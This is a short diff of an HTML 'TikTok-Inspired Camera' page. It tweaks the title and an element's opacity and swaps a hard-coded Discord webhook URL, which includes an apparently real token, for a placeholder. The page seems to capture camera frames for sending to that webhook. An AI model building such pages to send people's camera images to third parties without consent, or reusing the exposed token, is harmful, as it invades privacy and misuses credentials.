@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TikTok-Inspired new Camera</title>
+    <title>TikTok-Inspired Camera</title>
     <style>
         body {
             margin: 0;
@@ -27,6 +27,8 @@
             border-image: linear-gradient(to right, #f0f, #0ff, #f0f) 1;
             border-radius: 20px;
             box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
+            /* Add opacity here */
+            opacity: 0.5;  /* Adjust this value (0 to 1) for desired opacity */
         }
         button {
             margin-top: 20px;
@@ -80,7 +82,7 @@
         const ctx = canvas.getContext('2d');
 
         // Your Discord webhook URL
-        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1328823824275214336/zvW9MAN890FiTSeo53UINP2aHDjjBRxzXSHYzbggJiSfQdOS94XjH8Ex-aEfaUQy9TJ8";
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";
 
         let currentStream = null; // Hold the stream globally
 
